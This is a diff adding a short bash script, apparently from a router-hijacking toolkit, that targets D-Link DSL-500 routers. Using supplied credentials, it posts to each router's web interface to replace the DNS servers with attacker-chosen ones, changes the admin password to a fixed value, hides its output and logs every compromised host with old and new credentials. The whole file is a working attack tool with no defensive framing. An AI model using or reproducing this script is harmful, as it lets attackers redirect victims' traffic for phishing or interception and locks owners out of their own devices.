@@ -1,0 +1,18 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "${USERNAME}:${PASSWORD}" -d "dns_status=1&p_DNS=${DNS1}&a_DNS=${DNS2}&id=59" "http://${HOSTNAME}/Action" 1>/dev/null 2>/dev/null
+${CURL} -u "${USERNAME}:${PASSWORD}" -d "new_pass1=${PASSWD}&confirm_pass1=${PASSWD}&id=3" "http://${HOSTNAME}/Action" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [D-LINK DSL-500]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [D-LINK DSL-500]" >> logs/modificados.log
